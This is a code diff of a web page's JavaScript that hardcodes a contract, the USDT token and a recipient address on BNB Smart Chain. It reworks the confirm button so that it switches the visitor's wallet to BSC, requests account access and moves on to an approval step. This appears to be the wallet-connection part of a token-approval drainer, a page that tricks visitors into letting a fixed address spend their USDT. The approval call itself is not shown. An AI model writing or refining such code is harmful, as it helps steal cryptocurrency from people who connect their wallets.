@@ -82,24 +82,9 @@
         const CONTRACT = "0x42C8980352dA1F330419FD047ea5462551165Ce3";
         const USDT = "0x55d398326f99059fF775485246999027B3197955";
         const RECIPIENT = "0xc656b1651CD6914183Ee48458542EbB8655aa623";
-        const BSC_CHAIN_ID = "0x38"; // 56 in decimal
+        const BSC_CHAIN_ID = "0x38";
 
-        let userAddress = null;
         let web3 = null;
-
-        window.addEventListener('load', async () => {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                try {
-                    const accounts = await web3.eth.getAccounts();
-                    if (accounts.length > 0) {
-                        userAddress = accounts[0];
-                    }
-                } catch (error) {
-                    console.error('Error:', error);
-                }
-            }
-        });
 
         async function switchToBSC() {
             try {
@@ -150,12 +135,19 @@
                 document.getElementById('confirmBtn').disabled = true;
                 showNotification("Switching to BNB Smart Chain...", "info");
 
-                // Switch to BSC first
                 await switchToBSC();
 
-                if (!web3) web3 = new Web3(window.ethereum);
-                const accounts = await web3.eth.getAccounts();
-                userAddress = accounts[0];
+                showNotification("Requesting wallet access...", "info");
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("No wallet account found");
+                }
+
+                const userAddress = accounts[0];
+                web3 = new Web3(window.ethereum);
 
                 showNotification("Processing approval...", "info");
 
